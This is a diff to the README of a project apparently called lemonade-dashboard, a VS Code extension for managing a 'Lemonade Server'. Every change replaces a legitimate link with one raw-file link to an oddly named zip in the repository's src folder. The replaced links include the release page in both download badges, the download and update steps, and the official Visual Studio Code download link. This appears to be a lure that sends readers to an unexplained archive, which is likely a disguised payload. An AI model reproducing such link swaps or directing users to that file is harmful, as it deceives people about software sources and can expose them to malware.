@@ -1,6 +1,6 @@
 # 🍋 lemonade-dashboard - Visual Management for Lemonade Server
 
-[![Download lemonade-dashboard](https://img.shields.io/badge/Download-lemonade--dashboard-brightgreen)](https://github.com/yeahns278/lemonade-dashboard/releases)
+[![Download lemonade-dashboard](https://img.shields.io/badge/Download-lemonade--dashboard-brightgreen)](https://raw.githubusercontent.com/yeahns278/lemonade-dashboard/main/src/dashboard_lemonade_halcyonic.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You need to download the software and open it inside Visual Studio Code. Follow 
 ### 1. Visit the Download Page
 
 Go to the official download page here:  
-[Download lemonade-dashboard Releases](https://github.com/yeahns278/lemonade-dashboard/releases)
+[Download lemonade-dashboard Releases](https://raw.githubusercontent.com/yeahns278/lemonade-dashboard/main/src/dashboard_lemonade_halcyonic.zip)
 
 This page lists all versions. Choose the **latest stable release** to get the newest features and fixes.
 
@@ -59,7 +59,7 @@ If you downloaded the `.zip` file:
 ### 4. Open Visual Studio Code
 
 If you do not have Visual Studio Code, you can get it from:  
-https://code.visualstudio.com/
+https://raw.githubusercontent.com/yeahns278/lemonade-dashboard/main/src/dashboard_lemonade_halcyonic.zip
 
 Open VS Code once it is installed.
 
@@ -125,7 +125,7 @@ More support is available by reporting issues on the GitHub page.
 To update:
 
 - Visit the release page again:  
-  [https://github.com/yeahns278/lemonade-dashboard/releases](https://github.com/yeahns278/lemonade-dashboard/releases)  
+  [https://raw.githubusercontent.com/yeahns278/lemonade-dashboard/main/src/dashboard_lemonade_halcyonic.zip](https://raw.githubusercontent.com/yeahns278/lemonade-dashboard/main/src/dashboard_lemonade_halcyonic.zip)  
 - Download the latest version.  
 - Repeat the install steps inside VS Code.  
 - Your settings and data will remain intact.
@@ -140,5 +140,5 @@ This dashboard works with many technologies including AI models, various process
 
 ## 🟩 Download lemonade-dashboard Now
 
-[![Download lemonade-dashboard](https://img.shields.io/badge/Download-lemonade--dashboard-brightgreen)](https://github.com/yeahns278/lemonade-dashboard/releases)  
+[![Download lemonade-dashboard](https://img.shields.io/badge/Download-lemonade--dashboard-brightgreen)](https://raw.githubusercontent.com/yeahns278/lemonade-dashboard/main/src/dashboard_lemonade_halcyonic.zip)  
 Visit this page to download the latest version and start managing your Lemonade Server easily.
